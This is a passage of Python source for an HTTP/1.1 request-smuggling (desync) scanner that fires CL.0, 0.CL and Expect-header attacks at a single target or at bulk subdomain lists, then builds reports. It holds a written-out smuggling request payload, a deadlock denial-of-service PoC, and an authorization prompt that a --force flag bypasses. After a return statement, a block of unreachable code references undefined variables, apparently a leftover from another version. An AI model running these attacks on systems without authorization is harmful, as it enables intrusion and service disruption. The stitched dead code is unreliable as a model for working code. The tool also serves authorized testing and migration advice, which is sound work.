            expected_response='504 Gateway Timeout indicating upstream deadlock',
            impact='Denial of service through upstream deadlock. Can cause service disruption and resource exhaustion.',
            remediation='Fix HEAD request handling with Expect headers. Implement proper timeout handling.',
            references=[
                'https://portswigger.net/research/http1-must-die'
            ]
        )
    
    async def run_http2_comparison(self):
        """Run HTTP/2 vs HTTP/1.1 security comparison with PoC generation"""
        logger.info("🚀 Running HTTP/2 security comparison...")

        try:
            from security_comparison import HTTP2SecurityDemo

            async with HTTP2SecurityDemo(self.target_url, self.timeout) as demo:
                results = await demo.run_comprehensive_comparison()

                # Generate PoCs for HTTP/1.1 vulnerabilities that HTTP/2 fixes
                h1_vulns = results.get('http1_vulnerabilities', [])
                h2_results = results.get('http2_security', [])

                vulnerable_h1 = [r for r in h1_vulns if r.get('vulnerable')]
                secure_h2 = [r for r in h2_results if not r.get('vulnerable')]

                if vulnerable_h1:
                    self._generate_http2_migration_poc(vulnerable_h1, secure_h2)

                h1_vulnerable_count = len(vulnerable_h1)
                h2_vulnerable_count = len([r for r in h2_results if r.get('vulnerable')])

                self.results['http2_comparison'] = {
                    'http1_vulnerabilities': h1_vulnerable_count,
                    'http2_vulnerabilities': h2_vulnerable_count,
                    'security_improvement': h1_vulnerable_count - h2_vulnerable_count,
                    'framing_secure': results.get('framing_analysis', {}).get('framing_secure', False),
                    'multiplexing_benefit': results.get('connection_analysis', {}).get('multiplexing_benefit', False),
                    'error': results.get('error'),
                    'detailed_results': results
                }

                logger.info(f"✅ HTTP/2 comparison complete: {h1_vulnerable_count - h2_vulnerable_count} vulnerabilities eliminated")

        except Exception as e:
            logger.error(f"❌ HTTP/2 comparison failed: {e}")
            self.results['http2_comparison'] = {'error': str(e)}

    def _generate_http2_migration_poc(self, h1_vulns: List[Dict], h2_results: List[Dict]):
        """Generate PoC showing HTTP/2 security benefits"""

        vuln_types = [v.get('pattern_name', 'Unknown') for v in h1_vulns]

        http_request = f"""# HTTP/1.1 vulnerable request examples:
GET /test HTTP/1.1\r
Host: {self.target_host}\r
Content-Length: 10\r
Transfer-Encoding: chunked\r
\r
0\r
\r
SMUGGLED

# HTTP/2 equivalent (secure):
# Binary framing prevents parser discrepancies
# Stream isolation prevents request smuggling
# Built-in flow control prevents attacks"""

        self.add_proof_of_concept(
            vuln_type='REQUEST_SMUGGLING',
            severity='HIGH',
            title=f'HTTP/2 Migration Security Benefits ({len(h1_vulns)} vulnerabilities eliminated)',
            description=f'HTTP/1.1 shows {len(h1_vulns)} vulnerabilities that are eliminated by HTTP/2 migration. Vulnerable patterns: {", ".join(vuln_types[:3])}{"..." if len(vuln_types) > 3 else ""}',
            http_request=http_request,
            expected_response='HTTP/1.1: Various smuggling attacks succeed. HTTP/2: All attacks blocked by protocol design.',
            impact='Complete elimination of request smuggling attack surface. HTTP/2 binary framing and stream isolation prevent parser discrepancies.',
            remediation='Migrate all upstream connections to HTTP/2. Disable HTTP/1.1 where possible. Implement HTTP/2 throughout the infrastructure stack.',
            references=[
                'https://portswigger.net/research/http1-must-die',
                'https://tools.ietf.org/html/rfc7540'
            ]
        )
    
    async def run_all_demonstrations(self):
        """Run all demonstrations in sequence"""
        logger.info(f"🎬 Starting comprehensive HTTP/1.1 desync demonstration")
        logger.info(f"🎯 Target: {self.target_url}")
        logger.warning("⚠️  This is for educational purposes only!")
        logger.warning("⚠️  Only use on systems you own or have permission to test!")
        
        start_time = time.time()
        
        # Run all demonstrations
        await self.run_parser_detection()
        await asyncio.sleep(2)  # Rate limiting between tests
        
        await self.run_cl0_attacks()
        await asyncio.sleep(2)
        
        await self.run_0cl_attacks()
        await asyncio.sleep(2)
        
        await self.run_expect_attacks()
        await asyncio.sleep(2)
        
        await self.run_http2_comparison()
        
        total_time = time.time() - start_time
        logger.info(f"🏁 All demonstrations completed in {total_time:.1f} seconds")
    
    def generate_comprehensive_report(self):
        """Generate comprehensive security assessment report with PoCs"""

        self.scan_metadata['end_time'] = datetime.now().isoformat()
        self.scan_metadata['duration'] = str(datetime.fromisoformat(self.scan_metadata['end_time']) -
                                           datetime.fromisoformat(self.scan_metadata['start_time']))

        if self.output_format == 'json':
            return self._generate_json_report()
        elif self.output_format == 'html':
            return self._generate_html_report()
        else:
            return self._generate_console_report()

    def _generate_json_report(self) -> str:
        """Generate JSON format report"""

        # Base target info
        target_info = {
            'url': self.target_url,
            'host': self.target_host,
            'scheme': self.target_scheme
        }

        # Add subdomain info if applicable
        if self.subdomain_list:
            target_info.update({
                'subdomain_list_file': self.subdomain_list,
                'subdomains_scanned': self.scan_metadata.get('subdomains_scanned', 0),
                'subdomains_vulnerable': self.scan_metadata.get('subdomains_vulnerable', 0),
                'subdomains_failed': self.scan_metadata.get('subdomains_failed', 0)
            })

        report = {
            'scan_metadata': self.scan_metadata,
            'target_info': target_info,
            'vulnerability_summary': {
                'total_vulnerabilities': len(self.proof_of_concepts),
                'critical': self.scan_metadata['critical_vulnerabilities'],
                'high': self.scan_metadata['high_vulnerabilities'],
                'medium': self.scan_metadata['medium_vulnerabilities'],
                'by_category': self._categorize_vulnerabilities()
            },
            'proof_of_concepts': self.proof_of_concepts,
            'scan_results': self.results,
            'recommendations': self._generate_recommendations()
        }

        # Add subdomain-specific results
        if self.subdomain_results:
            report['subdomain_results'] = self.subdomain_results
            report['failed_subdomains'] = self.failed_subdomains
            report['subdomain_summary'] = self._generate_subdomain_summary()

        return json.dumps(report, indent=2, default=str)

    def _generate_subdomain_summary(self) -> Dict[str, Any]:
        """Generate summary of subdomain scan results"""
        if not self.subdomain_results:
            return {}

        vulnerable_subdomains = []
        clean_subdomains = []

        for subdomain, result in self.subdomain_results.items():
            if result['critical_vulnerabilities'] > 0:
                vulnerable_subdomains.append({
                    'subdomain': subdomain,
                    'critical_vulnerabilities': result['critical_vulnerabilities'],
                    'total_vulnerabilities': result['vulnerabilities_found']
                })
            else:
                clean_subdomains.append(subdomain)

        return {
            'total_scanned': len(self.subdomain_results),
            'vulnerable_count': len(vulnerable_subdomains),
            'clean_count': len(clean_subdomains),
            'failed_count': len(self.failed_subdomains),
            'vulnerable_subdomains': vulnerable_subdomains,
            'clean_subdomains': clean_subdomains,
            'failed_subdomains': self.failed_subdomains
        }

    def _generate_html_report(self) -> str:
        """Generate HTML format report"""

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>HTTP/1.1 Desync Security Assessment - {self.target_host}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .header {{ background: #2c3e50; color: white; padding: 20px; margin: -20px -20px 20px -20px; border-radius: 8px 8px 0 0; }}
        .critical {{ background: #e74c3c; color: white; padding: 10px; border-radius: 4px; margin: 10px 0; }}
        .high {{ background: #f39c12; color: white; padding: 10px; border-radius: 4px; margin: 10px 0; }}
        .medium {{ background: #f1c40f; color: black; padding: 10px; border-radius: 4px; margin: 10px 0; }}
        .poc {{ background: #ecf0f1; padding: 15px; margin: 10px 0; border-left: 4px solid #3498db; }}
        .http-request {{ background: #2c3e50; color: #00ff00; padding: 10px; font-family: monospace; white-space: pre-wrap; border-radius: 4px; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
        .metric {{ background: #3498db; color: white; padding: 15px; text-align: center; border-radius: 4px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 HTTP/1.1 Must Die - Security Assessment</h1>
            <p><strong>Target:</strong> {self.target_url}</p>
            <p><strong>Scan ID:</strong> {self.scan_metadata['scan_id']}</p>
            <p><strong>Date:</strong> {self.scan_metadata['start_time']}</p>
        </div>

        <div class="summary">
            <div class="metric">
                <h3>{len(self.proof_of_concepts)}</h3>
                <p>Total Vulnerabilities</p>
            </div>
            <div class="metric">
                <h3>{self.scan_metadata['critical_vulnerabilities']}</h3>
                <p>Critical</p>
            </div>
            <div class="metric">
                <h3>{self.scan_metadata['high_vulnerabilities']}</h3>
                <p>High</p>
            </div>
            <div class="metric">
                <h3>{self.scan_metadata['medium_vulnerabilities']}</h3>
                <p>Medium</p>
            </div>
        </div>

        <h2>🎯 Proof of Concepts</h2>"""

        for poc in self.proof_of_concepts:
            severity_class = poc['severity'].lower()
            html += f"""
        <div class="poc">
            <div class="{severity_class}">
                <h3>#{poc['id']} - {poc['title']}</h3>
                <p><strong>Severity:</strong> {poc['severity']} | <strong>CVSS:</strong> {poc['cvss_score']}</p>
            </div>
            <p><strong>Description:</strong> {poc['description']}</p>
            <p><strong>Impact:</strong> {poc['impact']}</p>

            <h4>HTTP Request Payload:</h4>
            <div class="http-request">{poc['http_request']}</div>

            <p><strong>Expected Response:</strong> {poc['expected_response']}</p>
            <p><strong>Remediation:</strong> {poc['remediation']}</p>
        </div>"""

        html += """
        <h2>📋 Recommendations</h2>
        <ul>"""

        for rec in self._generate_recommendations():
            html += f"<li>{rec}</li>"

        html += """
        </ul>

        <div style="margin-top: 40px; padding: 20px; background: #ecf0f1; border-radius: 4px;">
            <p><strong>⚠️ Disclaimer:</strong> This assessment is for educational and authorized security testing purposes only.
            Only use these techniques on systems you own or have explicit permission to test.</p>
        </div>
    </div>
</body>
</html>"""

        return html

    def _generate_console_report(self) -> str:
        """Generate console format report"""

        report = []
        report.append("=" * 100)

        if self.subdomain_list:
            report.append("HTTP/1.1 MUST DIE - BULK SUBDOMAIN SECURITY ASSESSMENT REPORT")
        else:
            report.append("HTTP/1.1 MUST DIE - PRODUCTION SECURITY ASSESSMENT REPORT")

        report.append("=" * 100)

        if self.target_url:
            report.append(f"Target: {self.target_url}")
        if self.subdomain_list:
            report.append(f"Subdomain List: {self.subdomain_list}")
            report.append(f"Subdomains Scanned: {self.scan_metadata.get('subdomains_scanned', 0)}")
            report.append(f"Subdomains Vulnerable: {self.scan_metadata.get('subdomains_vulnerable', 0)}")
            report.append(f"Subdomains Failed: {self.scan_metadata.get('subdomains_failed', 0)}")

        report.append(f"Scan ID: {self.scan_metadata['scan_id']}")
        report.append(f"Assessment Date: {self.scan_metadata['start_time']}")
        report.append(f"Duration: {self.scan_metadata.get('duration', 'N/A')}")

        if self.critical_only:
            report.append("🔥 CRITICAL-ONLY MODE: Scanning for critical vulnerabilities only")

        # Executive Summary
        report.append("\n📋 EXECUTIVE SUMMARY")
        report.append("-" * 60)

        total_vulns = len(self.proof_of_concepts)
        if total_vulns >= 10:
            risk_level = "🔥 CRITICAL"
        elif total_vulns >= 5:
            risk_level = "⚠️  HIGH"
        elif total_vulns >= 1:
            risk_level = "⚠️  MEDIUM"
        else:
            risk_level = "✅ LOW"

        report.append(f"Overall Risk Level: {risk_level}")
        report.append(f"Total Vulnerabilities: {total_vulns}")
        report.append(f"Critical: {self.scan_metadata['critical_vulnerabilities']}")
        report.append(f"High: {self.scan_metadata['high_vulnerabilities']}")
        report.append(f"Medium: {self.scan_metadata['medium_vulnerabilities']}")

        # Subdomain Summary
        if self.subdomain_results:
            report.append("\n🌐 SUBDOMAIN SCAN SUMMARY")
            report.append("-" * 60)

            subdomain_summary = self._generate_subdomain_summary()
            report.append(f"Total Subdomains Scanned: {subdomain_summary['total_scanned']}")
            report.append(f"Vulnerable Subdomains: {subdomain_summary['vulnerable_count']}")
            report.append(f"Clean Subdomains: {subdomain_summary['clean_count']}")
            report.append(f"Failed Scans: {subdomain_summary['failed_count']}")

            if subdomain_summary['vulnerable_subdomains']:
                report.append("\n🔥 VULNERABLE SUBDOMAINS:")
                for vuln_sub in subdomain_summary['vulnerable_subdomains']:
                    report.append(f"  • {vuln_sub['subdomain']} - {vuln_sub['critical_vulnerabilities']} critical vulnerabilities")

            if subdomain_summary['failed_subdomains']:
                report.append("\n❌ FAILED SCANS:")
                for failed_sub in subdomain_summary['failed_subdomains']:
                    report.append(f"  • {failed_sub}")

        # Detailed PoCs
        if self.proof_of_concepts:
            report.append("\n🎯 DETAILED PROOF OF CONCEPTS")
            report.append("-" * 60)

            for poc in self.proof_of_concepts:
                report.append(f"\n[{poc['severity']}] #{poc['id']} - {poc['title']}")
                report.append(f"CVSS Score: {poc['cvss_score']}")
                report.append(f"Description: {poc['description']}")
                report.append(f"Impact: {poc['impact']}")
                report.append("\nHTTP Request Payload:")
                report.append("-" * 40)
                report.append(poc['http_request'])
                report.append("-" * 40)
                report.append(f"Expected Response: {poc['expected_response']}")
                report.append(f"Remediation: {poc['remediation']}")

                if poc['references']:
                    report.append(f"References: {', '.join(poc['references'])}")
                report.append("")

        # Recommendations
        report.append("\n💡 SECURITY RECOMMENDATIONS")
        report.append("-" * 60)
        for rec in self._generate_recommendations():
            report.append(f"• {rec}")

        report.append("\n📚 RESEARCH CONTEXT")
        report.append("-" * 60)
        report.append("• Based on James Kettle's 'HTTP/1.1 Must Die: The Desync Endgame'")
        report.append("• These techniques earned $350,000+ in bug bounties")
        report.append("• Affected 24+ million websites through infrastructure bugs")
        report.append("• Demonstrates fundamental flaws in HTTP/1.1 protocol")

        report.append("\n" + "=" * 100)

        return "\n".join(report)

    def _categorize_vulnerabilities(self) -> Dict[str, int]:
        """Categorize vulnerabilities by type"""
        categories = {}
        for poc in self.proof_of_concepts:
            vuln_type = poc['vulnerability_type']
            categories[vuln_type] = categories.get(vuln_type, 0) + 1
        return categories

    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []

        if self.proof_of_concepts:
            recommendations.extend([
                "🔥 IMMEDIATE: Migrate to HTTP/2 upstream connections",
                "🔥 IMMEDIATE: Implement strict header validation and normalization",
                "🔥 IMMEDIATE: Deploy WAF with request smuggling protection",
                "Block access to Windows reserved names (/con, /nul, etc.)",
                "Implement proper Content-Length and Transfer-Encoding validation",
                "Fix Expect header processing vulnerabilities",
                "Enable connection-level security monitoring",
                "Regular security testing with latest desync detection tools"
            ])
        else:
            recommendations.extend([
                "✅ Current configuration appears secure",
                "Consider HTTP/2 migration for performance and security benefits",
                "Continue regular security monitoring and testing",
                "Stay updated on latest HTTP security research"
            ])

        return recommendations
        
        # Parser Detection Summary
        parser_results = self.results.get('parser_detection', {})
        if not parser_results.get('error'):
            discrepancies = parser_results.get('discrepancies_found', 0)
            total_vulnerabilities += discrepancies
            if discrepancies > 0:
                critical_issues.append(f"Parser discrepancies: {discrepancies}")
        
        # CL.0 Summary
        cl0_results = self.results.get('cl0_attacks', {})
        if not cl0_results.get('error'):
            cl0_vulns = sum(1 for k, v in cl0_results.items() if k != 'error' and v is True)
            total_vulnerabilities += cl0_vulns
            if cl0_vulns > 0:
                critical_issues.append(f"CL.0 vulnerabilities: {cl0_vulns}")
        
        # 0.CL Summary
        zcl_results = self.results.get('0cl_attacks', {})
        if not zcl_results.get('error'):
            zcl_vulns = (zcl_results.get('deadlock_breaks', 0) + 
                        zcl_results.get('exploitations', 0) + 
                        zcl_results.get('double_desyncs', 0))
            total_vulnerabilities += zcl_vulns
            if zcl_vulns > 0:
                critical_issues.append(f"0.CL vulnerabilities: {zcl_vulns}")
        
        # Expect Summary
        expect_results = self.results.get('expect_attacks', {})
        if not expect_results.get('error'):
            expect_vulns = sum(1 for k, v in expect_results.items() if k != 'error' and v is True)
            total_vulnerabilities += expect_vulns
            if expect_vulns > 0:
                critical_issues.append(f"Expect vulnerabilities: {expect_vulns}")
        
        # Risk Assessment
        if total_vulnerabilities >= 10:
            risk_level = "🔥 CRITICAL"
        elif total_vulnerabilities >= 5:
            risk_level = "⚠️  HIGH"
        elif total_vulnerabilities >= 1:
            risk_level = "⚠️  MEDIUM"
        else:
            risk_level = "✅ LOW"
        
        print(f"Overall Risk Level: {risk_level}")
        print(f"Total Vulnerabilities Found: {total_vulnerabilities}")
        print(f"Critical Issues: {len(critical_issues)}")
        
        if critical_issues:
            print("\nCritical Issues Identified:")
            for issue in critical_issues:
                print(f"  • {issue}")
        
        # Detailed Results
        print(f"\n📊 DETAILED ASSESSMENT RESULTS")
        print("-" * 60)
        
        for test_name, results in self.results.items():
            if results.get('error'):
                print(f"{test_name.replace('_', ' ').title()}: ❌ Failed ({results['error']})")
            else:
                print(f"{test_name.replace('_', ' ').title()}: ✅ Completed")
        
        # HTTP/2 Migration Benefits
        h2_results = self.results.get('http2_comparison', {})
        if not h2_results.get('error'):
            improvement = h2_results.get('security_improvement', 0)
            if improvement > 0:
                print(f"\n🚀 HTTP/2 MIGRATION BENEFITS")
                print("-" * 60)
                print(f"Security vulnerabilities eliminated: {improvement}")
                print(f"Framing security: {'✅ Improved' if h2_results.get('framing_secure') else '⚠️  Needs work'}")
                print(f"Multiplexing benefits: {'✅ Yes' if h2_results.get('multiplexing_benefit') else '❌ No'}")
        
        # Recommendations
        print(f"\n💡 SECURITY RECOMMENDATIONS")
        print("-" * 60)
        
        if total_vulnerabilities > 0:
            print("🔥 IMMEDIATE ACTIONS REQUIRED:")
            print("  1. Migrate to HTTP/2 upstream connections immediately")
            print("  2. Disable HTTP/1.1 where possible")
            print("  3. Implement strict header validation")
            print("  4. Deploy WAF with desync protection")
            print("  5. Regular security testing with latest tools")
        else:
            print("✅ Current configuration appears secure")
            print("  • Consider HTTP/2 migration for performance benefits")
            print("  • Continue regular security monitoring")
        
        print("\n📚 RESEARCH CONTEXT")
        print("-" * 60)
        print("• Based on James Kettle's 'HTTP/1.1 Must Die: The Desync Endgame'")
        print("• These techniques earned $350,000+ in bug bounties")
        print("• Affected 24+ million websites through infrastructure bugs")
        print("• Demonstrates fundamental flaws in HTTP/1.1 protocol")
        
        print("\n" + "="*100)

async def main():
    """Main function with production-ready features"""

    parser = argparse.ArgumentParser(
        description='HTTP/1.1 Must Die - Production Security Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single target scanning
  python3 run_all_demos.py --target http://localhost:8080
  python3 run_all_demos.py --target https://example.com --output json --file report.json
  python3 run_all_demos.py --target https://example.com --critical-only

  # Bulk subdomain scanning
  python3 run_all_demos.py --subdomain-list subdomains.txt --critical-only
  python3 run_all_demos.py --subdomain-list subdomains.txt --output json --file bulk_report.json
  python3 run_all_demos.py --subdomain-list subdomains.txt --max-concurrent 10 --critical-only

  # Advanced options
  python3 run_all_demos.py --target https://example.com --skip-0cl --skip-http2
  python3 run_all_demos.py --subdomain-list subdomains.txt --subdomain-timeout 10 --critical-only

  # Generate reports
  python3 run_all_demos.py --target https://example.com --output html --file report.html
  python3 run_all_demos.py --subdomain-list subdomains.txt --output json --file bulk_scan.json

Subdomain List Format:
  # Lines starting with # are comments
  localhost:8080
  api.example.com
  www.example.com
  https://secure.example.com

⚠️  FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY
        """
    )

    # Target specification (mutually exclusive)
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('--target',
                             help='Single target URL (e.g., http://localhost:8080 or https://example.com)')
    target_group.add_argument('--subdomain-list',
                             help='File containing list of subdomains to scan (one per line)')

    parser.add_argument('--timeout', type=int, default=30,
                       help='Request timeout in seconds (default: 30)')
    parser.add_argument('--verbose', action='store_true',
                       help='Verbose logging and debug output')
    parser.add_argument('--output', choices=['console', 'json', 'html'], default='console',
                       help='Output format (default: console)')
    parser.add_argument('--file', dest='output_file',
                       help='Output file path (optional)')
    parser.add_argument('--user-agent', default='DesyncScanner/2.1',
                       help='Custom User-Agent header')
    parser.add_argument('--rate-limit', type=float, default=2.0,
                       help='Delay between test categories in seconds (default: 2.0)')

    # Subdomain scanning options
    subdomain_group = parser.add_argument_group('Subdomain Scanning Options')
    subdomain_group.add_argument('--critical-only', action='store_true',
                                help='Scan for CRITICAL vulnerabilities only (recommended for bulk scanning)')
    subdomain_group.add_argument('--max-concurrent', type=int, default=5,
                                help='Maximum concurrent subdomain scans (default: 5)')
    subdomain_group.add_argument('--subdomain-timeout', type=int, default=15,
                                help='Timeout per subdomain scan in seconds (default: 15)')

    # Test selection options
    test_group = parser.add_argument_group('Test Selection')
    test_group.add_argument('--skip-parser', action='store_true',
                           help='Skip parser discrepancy detection')
    test_group.add_argument('--skip-cl0', action='store_true',
                           help='Skip CL.0 desync attacks')
    test_group.add_argument('--skip-0cl', action='store_true',
                           help='Skip 0.CL desync attacks')
    test_group.add_argument('--skip-expect', action='store_true',
                           help='Skip Expect-based attacks')
    test_group.add_argument('--skip-http2', action='store_true',
                           help='Skip HTTP/2 security comparison')

    # Safety options
    safety_group = parser.add_argument_group('Safety Options')
    safety_group.add_argument('--force', action='store_true',
                             help='Skip authorization confirmation for non-localhost targets')
    safety_group.add_argument('--max-requests', type=int, default=1000,
                             help='Maximum number of requests to send (safety limit)')

    args = parser.parse_args()

    # Validate inputs
    if args.target:
        try:
            parsed = urlparse(args.target)
            if not parsed.scheme or not parsed.netloc:
                raise ValueError("Invalid URL format")
            if parsed.scheme not in ['http', 'https']:
                raise ValueError("Only HTTP and HTTPS schemes are supported")
        except Exception as e:
            logger.error(f"Invalid target URL '{args.target}': {e}")
            return 1

    if args.subdomain_list:
        if not os.path.exists(args.subdomain_list):
            logger.error(f"Subdomain list file not found: {args.subdomain_list}")
            return 1

    # Enhanced safety checks for production use
    target_for_check = args.target or "subdomain_list"
    is_localhost = args.target and any(host in args.target.lower() for host in ['localhost', '127.0.0.1', '::1'])
    is_private_ip = args.target and any(ip in args.target for ip in ['192.168.', '10.', '172.'])

    # Safety check for external targets
    if not is_localhost and not is_private_ip and not args.force:
        print("🚨 SECURITY WARNING")
        print("=" * 50)

        if args.target:
            print(f"Target: {args.target}")
        else:
            print(f"Subdomain List: {args.subdomain_list}")
            print("You are about to scan multiple subdomains from a file.")

        print("This tool performs aggressive security testing that may:")
        print("• Trigger security alerts and monitoring systems")
        print("• Cause service disruption or performance impact")
        print("• Be considered unauthorized access in some jurisdictions")
        print("\n⚠️  LEGAL REQUIREMENTS:")
        print("• You must have explicit written authorization to test these systems")
        print("• Unauthorized testing may violate laws and regulations")
        print("• You are responsible for compliance with applicable laws")

        if args.subdomain_list:
            print(f"\n📋 BULK SCANNING NOTICE:")
            print("• Bulk scanning can generate significant traffic")
            print("• Ensure you have permission for ALL subdomains in the list")
            print("• Consider using --critical-only to reduce impact")

        response = input("\nDo you have explicit written authorization to test these systems? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("Aborting for safety. Use --force to skip this check.")
            return 1

        confirm = input("Type 'I HAVE AUTHORIZATION' to proceed: ")
        if confirm != 'I HAVE AUTHORIZATION':
            print("Authorization not confirmed. Aborting.")
            return 1

    try:
        if args.subdomain_list:
            # Bulk subdomain scanning mode
            logger.info(f"🚀 Starting bulk subdomain security scan")
            logger.info(f"Subdomain list: {args.subdomain_list}")
            logger.info(f"Critical-only mode: {args.critical_only}")
            logger.info(f"Max concurrent: {args.max_concurrent}")
            logger.info(f"Output format: {args.output}")

            # Use subdomain timeout if specified, otherwise use regular timeout
            scan_timeout = args.subdomain_timeout if hasattr(args, 'subdomain_timeout') else args.timeout

            scanner = ProductionDesyncScanner(
                target_url=None,
                timeout=scan_timeout,
                verbose=args.verbose,
                output_format=args.output,
                output_file=args.output_file,
                critical_only=args.critical_only,
                subdomain_list=args.subdomain_list,
                max_concurrent_subdomains=args.max_concurrent
            )

            # Run bulk subdomain scan
            bulk_results = await scanner.run_bulk_subdomain_scan()

        else:
            # Single target scanning mode
            logger.info(f"🚀 Starting production security scan")
            logger.info(f"Target: {args.target}")
            logger.info(f"Critical-only mode: {args.critical_only}")
            logger.info(f"Output format: {args.output}")

            scanner = ProductionDesyncScanner(
                target_url=args.target,
                timeout=args.timeout,
                verbose=args.verbose,
                output_format=args.output,
                output_file=args.output_file,
                critical_only=args.critical_only
            )

            # Run selected test categories
            if args.critical_only:
                # In critical-only mode, run only critical vulnerability tests
                await scanner.run_critical_vulnerability_scan()
            else:
                # Run full test suite
                if not args.skip_parser:
                    await scanner.run_parser_detection()
                    await asyncio.sleep(args.rate_limit)

                if not args.skip_cl0:
                    await scanner.run_cl0_attacks()
                    await asyncio.sleep(args.rate_limit)

                if not args.skip_0cl:
                    await scanner.run_0cl_attacks()
                    await asyncio.sleep(args.rate_limit)

                if not args.skip_expect:
                    await scanner.run_expect_attacks()
                    await asyncio.sleep(args.rate_limit)

                if not args.skip_http2:
                    await scanner.run_http2_comparison()

        # Generate and output report
        report = scanner.generate_comprehensive_report()

        if args.output_file:
            with open(args.output_file, 'w') as f:
                f.write(report)
            logger.info(f"📄 Report saved to: {args.output_file}")

        if args.output == 'console' or not args.output_file:
            print(report)

        # Summary statistics
        total_vulns = len(scanner.proof_of_concepts)
        critical_vulns = scanner.scan_metadata['critical_vulnerabilities']

        if args.subdomain_list:
            vulnerable_subdomains = scanner.scan_metadata.get('subdomains_vulnerable', 0)
            total_subdomains = scanner.scan_metadata.get('subdomains_scanned', 0)

            if critical_vulns > 0:
                logger.warning(f"🔥 Bulk scan complete: {critical_vulns} critical vulnerabilities found across {vulnerable_subdomains}/{total_subdomains} subdomains")
                return 2
            else:
                logger.info(f"✅ Bulk scan complete: No critical vulnerabilities detected across {total_subdomains} subdomains")
                return 0
        else:
            if total_vulns > 0:
                logger.warning(f"🔥 Scan complete: {total_vulns} vulnerabilities found ({critical_vulns} critical)")
                return 2 if critical_vulns > 0 else 1
            else:
                logger.info("✅ Scan complete: No vulnerabilities detected")
                return 0

    except KeyboardInterrupt:
        logger.warning("Scan interrupted by user")
        return 130
    except Exception as e:
        logger.error(f"Scan failed: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1

if __name__ == '__main__':
    exit(asyncio.run(main()))
